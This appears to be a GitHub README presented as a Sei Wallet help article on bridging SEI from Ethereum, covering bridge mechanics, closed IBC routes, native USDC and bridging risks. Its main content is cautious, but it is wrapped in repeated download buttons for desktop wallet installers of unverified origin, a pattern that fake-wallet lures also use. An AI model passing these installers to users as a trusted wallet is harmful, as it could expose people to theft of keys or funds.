![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">Bridging SEI from Ethereum into Sei Wallet</h1>

<p align="center">Bridge from Ethereum, then confirm which chain and which address received it.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Bridging SEI from Ethereum into Sei gives you a representation of the asset rather than the asset itself, which is why the bridge contract matters more than the transfer. A bridge locks or burns an asset on one chain and issues a representation on another, and the representation is only as good as the contract that issued it. That distinction decides everything that follows: what you receive, what you can do with it, and what happens if the bridge is wrong.

It also matters that Sei is EVM-compatible, because it changes which routes exist. The Cosmos-side bridging route that once connected Sei to the wider ecosystem is closed. Sei's documentation records both IBC directions switched off, the outbound one by Proposal #121 on 31 July 2026, so a guide describing an IBC route into Sei is describing a mechanism that no longer runs.

## What a bridge actually does

1. You send an asset to a contract on the source chain.
2. The contract locks it, or burns it.
3. A message or attestation travels to the destination chain.
4. A contract there mints or releases a representation.

Every step is a contract interaction, which means every step can fail, be paused, be misconfigured, or be exploited. None of that is specific to Sei; it is what bridging is.

Two consequences follow:

- **What arrives is a representation**, unless the bridge is a canonical issuer route. A bridged token is a claim on the bridge, not the underlying asset.
- **The fee is higher than a transfer**, because you are paying for contract execution on both sides plus whatever the bridge charges.

## The routes that exist, and the one that does not

**EVM-to-EVM bridges** connect Sei to other EVM chains, including Ethereum. These are contract-based and depend on the bridge operator. Which ones are live, and which contracts are canonical, changes over time - take that from Sei's documentation and the bridge's own site, typed rather than followed from a link.

**Native USDC via Circle's CCTP** is a different model: the issuer burns and mints its own asset rather than wrapping it. Sei's docs describe native USDC and CCTP V2 as supported, with the older Noble-issued USDC.n deprecated. If your goal is dollars on Sei, that is the route to look at rather than a wrapped stablecoin.

**IBC is closed.** The IBC precompile cannot succeed, so there is no Cosmos-side path and no replacement for one. [IBC transfers](https://github.com/sei-chain/sei-wallet-staking/blob/main/ibc-transfer-keeps-pending.md) submitted before the change are a separate, unfinished story.

## Before you bridge anything

- **Confirm the contract address from the official documentation**, not from a search result or a message. A fake bridge is one of the most profitable scams in this space because the user is already primed to send funds to a contract.
- **Check what you will receive.** The same ticker on two chains can be two different assets. A bridged SEI is not native SEI; it is a claim, and it may not be stakeable, spendable for gas, or redeemable if liquidity disappears.
- **Check the destination address form.** A `0x...` address is what an EVM bridge expects. Sending to a `sei1...` form through a bridge interface is a mismatch that at best fails.
- **Have gas on both sides.** You need ETH to move on Ethereum and SEI to do anything after arrival on Sei.
- **Start with a small amount.** Bridge fees make this expensive to test repeatedly, but the first transfer through an unfamiliar contract is exactly the one to keep small.

## What arrives, and what it can do

A bridged representation may be:

- **transferable but not stakeable**, because staking applies to native SEI;
- **dependent on the bridge's liquidity** for redemption back;
- **subject to the bridge's pause switch**, which can freeze withdrawals during an incident.

Native SEI, by contrast, pays gas and can be delegated. If your plan is to stake, check whether the asset you are receiving is native before you commit - [staking the bridged balance](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) only works on native SEI held in an account you control.

## After it arrives

1. **Confirm the balance in [the receiving wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)** on chain 1329, not just the bridge's own status page.
2. **Check the token contract** matches what the bridge documented, not just the ticker.
3. **Do not immediately re-bridge it** to "test". Each hop costs fees and adds contract exposure.
4. **Record the transaction hash** for both legs. If something goes wrong, that is the only evidence anyone can act on.

If a bridge reports success and the destination shows nothing, the likely causes are the wrong destination address, the wrong network selected in the wallet, or a delay in the bridge's own relayer. An explorer's pending status distinguishes the last case from the others.

## The risks worth naming plainly

- **Contract risk.** Bridges hold value by design, which makes them targets. A bug or an exploit is not hypothetical in this category.
- **Representation risk.** A wrapped asset depends on the bridge operator's solvency and honesty, not on the underlying chain.
- **Interface risk.** A convincing bridge front end that sends your approval somewhere else is the standard phishing shape; [the Sei Wallet safety question](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) is the broader version of the same problem.
- **Irreversibility.** A confirmed bridge transaction is final; there is no support line that can unwind it.

What you can control is small but real: verified contract addresses, small first amounts, and a clear idea of what you are receiving.

## If you are moving from Ethereum and do not need a bridge

Two alternatives are usually better than bridging:

- **Buy or withdraw SEI directly on Sei** through an exchange that supports the network. That avoids a contract entirely, and the exchange withdrawal article in this set covers the address and network rules.
- **Use a wallet that supports both chains** and keep the assets separate rather than wrapping one into the other - [MetaMask as the bridge side](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) is the common configuration for that.

Bridging is worth it when you specifically need an asset that only exists on the other chain. It is rarely worth it for moving value between two chains that both list the asset.

## Frequently asked questions

**Can I bridge SEI from Ethereum to Sei?** Yes, through an EVM bridge, which issues a representation rather than native SEI. Confirm the contract from official documentation before sending anything.

**Is bridged SEI the same as native SEI?** No. It is a claim on a bridge contract. It may not pay gas or support staking.

**Does IBC still work?** No. Both directions are off per Sei's documentation, outbound since Proposal #121 passed on 31 July 2026.

**Why did my bridge transaction cost so much?** Contract execution on two chains plus the bridge's fee. It is not comparable to a simple transfer.

**What if the bridge shows success and nothing arrives?** Check the destination address, the selected network, and the bridge's relayer status. Then treat it as a support question with both transaction hashes.

**Can I undo a bridge transaction?** No. It is final once confirmed.

**Is native USDC different from bridged USDC?** Yes. Native USDC is issued by Circle through CCTP; the older Noble-issued USDC.n is deprecated per Sei's docs. [The address association](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) is unrelated but often confused with this - one is about which form an address takes, the other about which asset you hold.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [An IBC transfer pending on its way to Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/ibc-transfer-keeps-pending.md)
- [How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
